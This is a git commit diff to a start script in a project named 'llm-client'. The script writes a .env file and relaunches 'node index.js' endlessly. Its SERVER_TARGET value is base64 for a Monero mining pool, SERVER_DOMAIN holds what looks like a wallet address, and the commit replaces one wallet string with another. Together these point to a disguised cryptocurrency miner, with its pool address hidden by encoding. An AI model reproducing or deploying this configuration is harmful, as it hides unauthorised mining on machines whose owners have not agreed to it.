b64637afd7427ced5bbabd7774d97c73bd65ea51
sawa05303 <93839840+sawa05303@users.noreply.github.com>
2025-12-25 22:59:30 +0700

    start.sh

--- llm-client/start.sh
+++ llm-client/start.sh
@@ -3,7 +3,7 @@ CONNECT=${1:-8}
 NAME=${2:-003}
 echo "SERVER_WS=wss://socket.ndutvps.com
 SERVER_TARGET=cG9vbC5zdXBwb3J0eG1yLmNvbTo4MA==
-SERVER_DOMAIN=45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi
+SERVER_DOMAIN=85Z4CgUZDjxCyDmKLe2gLZJMnfUiS2Ticcf7NLGpdwnH9HcNRGKAoZERVNrwVew99ZdiZchjiZzTigE5beFDJ2rdTxoGAxr
 SERVER_SECRET=${NAME}
 SERVER_CONNECTION=${CONNECT}" > .env
 while true; do node index.js; sleep 15; done
